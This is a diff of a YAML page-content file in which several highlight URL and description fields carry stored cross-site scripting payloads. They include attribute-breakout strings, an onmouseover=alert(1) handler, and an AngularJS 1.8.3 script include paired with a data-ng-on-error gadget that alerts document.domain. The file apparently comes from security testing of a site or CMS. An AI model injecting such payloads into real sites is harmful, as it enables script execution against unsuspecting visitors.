@@ -19,12 +19,12 @@ sections:
           description: <b>testtest2</b>
           url: https://google.com/ttt"'>testframesetfffffewfewf213
         - title: Highlight B
-          description: Important highlight B is equally important
-          url: https://test.com/"'>payload123<script
+          description: ""
+          url: https://test.com/" onmouseover=alert(1) >newAttribute<script
             src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
             <img data-ng-app=""
-            data-ng-on-error="$event.target.ownerDocument.defaultView.alert(1)"
-            src="x">uu
+            data-ng-on-error="$event.target.ownerDocument.defaultView.alert(document.domain)"
+            src="x">
         - title: Page A
           description: Page A is important too
           url: /privacy/
